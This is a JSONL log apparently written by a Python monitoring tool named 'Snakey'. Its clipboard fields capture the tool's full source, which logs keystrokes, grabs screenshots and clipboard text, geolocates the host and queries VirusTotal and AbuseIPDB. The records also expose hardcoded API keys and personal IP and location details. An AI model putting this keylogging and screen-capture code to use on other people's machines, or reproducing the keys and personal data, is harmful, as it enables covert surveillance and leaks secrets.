["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "d0c3fc2ddc4c057da744239d6a9302a22e91fd31e24cc3ed1a07107c48a75f29", "screenshot_hash": "12e6516ef6d502651181340639b0875840758a5a02ecf925ef92cd0dc5e24138", "log_hash": "3ce25d5ddd906ce46fcde478655b69fe63a4c71bb819c97ceeb1d47fd008d868"}
{"timestamp": "2025-05-22T19:02:35.101635", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:63e1:b252:3e9:9478", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "def scan_with_yara():\r\n    findings = []\r\n    try:\r\n        current_dir = os.getcwd()\r\n        os.chdir(base_path)  # Change to the directory where malware_index.yar and malware/ folder exist\r\n\r\n        rules = yara.compile(filepath=\"malware_index.yar\")\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n\r\n        os.chdir(current_dir)  # Restore original working directory\r\n\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: (2, 'No such file or directory')"}], "clipboard_hash": "d0c3fc2ddc4c057da744239d6a9302a22e91fd31e24cc3ed1a07107c48a75f29", "screenshot_hash": "457dc7f0842ff26adde454d4cf17b2f03c95297e501895ef92e7b22c70d6de01", "log_hash": "de8d9ff7caadce9550642d7860daadebaced35e5539f67882bfa45cab07b3ed8"}
{"timestamp": "2025-05-22T19:12:49.644432", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:63e1:b252:3e9:9478", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# YARA Configuration\r\n# Point scan directory to your malware folder with YARA rules inside\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\nyara_scan_dirs = [\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules/malware\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        current_dir = os.getcwd()\r\n        os.chdir(os.path.dirname(yara_rules_path))  # Change to the directory where malware_index.yar and malware/ folder exist\r\n\r\n        rules = yara.compile(filepath=os.path.basename(yara_rules_path))\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n\r\n        os.chdir(current_dir)  # Restore original working directory\r\n\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"keystroke_hash\"] = hash_text(session_log[\"keystrokes\"])\r\n\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Scan malware directory with YARA rules\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n\r\n    try:\r\n        while True:\r\n            if os.path.exists(stop_file_path):\r\n                print(\"[INFO] Snakey terminated by stop file.\")\r\n                break\r\n\r\n            session_log = collect_full_session()\r\n            log_to_wazuh_file(session_log)\r\n            time.sleep(15)\r\n    finally:\r\n        if os.path.exists(stop_file_path):\r\n            os.remove(stop_file_path)\r\n            print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "6043034d9f6d0a6dab2297170f15bc9cc005b4d66912860b6716ce2c7d0f46ac", "screenshot_hash": "6bfdca1dd84ae4a02cd067c3a063f24cb170ecee12973144a9ed51f459abe7f4", "keystroke_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-22T19:13:17.366333", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:63e1:b252:3e9:9478", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# YARA Configuration\r\n# Point scan directory to your malware folder with YARA rules inside\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\nyara_scan_dirs = [\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules/malware\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\"\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        current_dir = os.getcwd()\r\n        os.chdir(os.path.dirname(yara_rules_path))  # Change to the directory where malware_index.yar and malware/ folder exist\r\n\r\n        rules = yara.compile(filepath=os.path.basename(yara_rules_path))\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n                    try:\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except Exception:\r\n                        continue  # Ignore files that cause errors\r\n\r\n        os.chdir(current_dir)  # Restore original working directory\r\n\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan failed: {e}\"})\r\n    return findings\r\n\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = list(set(item[4][0] for item in addr_info if ':' not in item[4][0]))\r\n        ipv6s = list(set(item[4][0] for item in addr_info if ':' in item[4][0]))\r\n        session_log[\"system\"][\"private_ip_v4\"] = ipv4s[0] if ipv4s else \"Not found\"\r\n        session_log[\"system\"][\"ip_v6\"] = ipv6s[0] if ipv6s else \"Not found\"\r\n\r\n        ip_info = requests.get(\"https://ipinfo.io/json\").json()\r\n        public_ip = ip_info.get(\"ip\")\r\n        session_log[\"system\"].update({\r\n            \"public_ip\": public_ip,\r\n            \"country\": ip_info.get(\"country\"),\r\n            \"region\": ip_info.get(\"region\"),\r\n            \"city\": ip_info.get(\"city\"),\r\n            \"isp\": ip_info.get(\"org\", \"Unknown\")\r\n        })\r\n\r\n        if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n        abuse_info = check_ip_reputation_abuseipdb(public_ip)\r\n        if abuse_info:\r\n            session_log[\"abuseipdb\"] = abuse_info\r\n            if abuse_info.get(\"abuse_score\", 0) > 50:\r\n                session_log[\"alerts\"].append(f\"High abuse score IP ({abuse_info['abuse_score']}): {public_ip}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"keystroke_hash\"] = hash_text(session_log[\"keystrokes\"])\r\n\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Scan malware directory with YARA rules\r\n    session_log[\"yara_findings\"] = scan_with_yara()\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n\r\n    try:\r\n        while True:\r\n            if os.path.exists(stop_file_path):\r\n                print(\"[INFO] Snakey terminated by stop file.\")\r\n                break\r\n\r\n            session_log = collect_full_session()\r\n            log_to_wazuh_file(session_log)\r\n            time.sleep(15)\r\n    finally:\r\n        if os.path.exists(stop_file_path):\r\n            os.remove(stop_file_path)\r\n            print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "yara_findings": [{"error": "YARA scan failed: ./malware/MALW_AZORULT.yar(23): invalid field name \"sync\""}], "clipboard_hash": "6043034d9f6d0a6dab2297170f15bc9cc005b4d66912860b6716ce2c7d0f46ac", "screenshot_hash": "c0058e5985a3109de1cb994784b8c89788324473af8cd3ed8fb7904073471b96", "keystroke_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"timestamp": "2025-05-22T19:13:44.220470", "system": {"username": "user", "hostname": "MSI", "private_ip_v4": "192.168.1.71", "ip_v6": "2001:8a0:df46:3c00:63e1:b252:3e9:9478", "public_ip": "2.83.128.150", "country": "PT", "region": "Lisbon", "city": "Torres Vedras", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": " },\r\n        \"yara_findings\": [\r\n            {\r\n                \"error\": \"YARA scan failed: (2, 'No such file or directory')\"\r\n            }\r\n        ],", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "abuseipdb": {"abuse_score": 0, "total_reports": 0, "country": "PT", "isp": "PT Comunicacoes S.A.", "domain": "meo.pt", "last_reported": null}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", 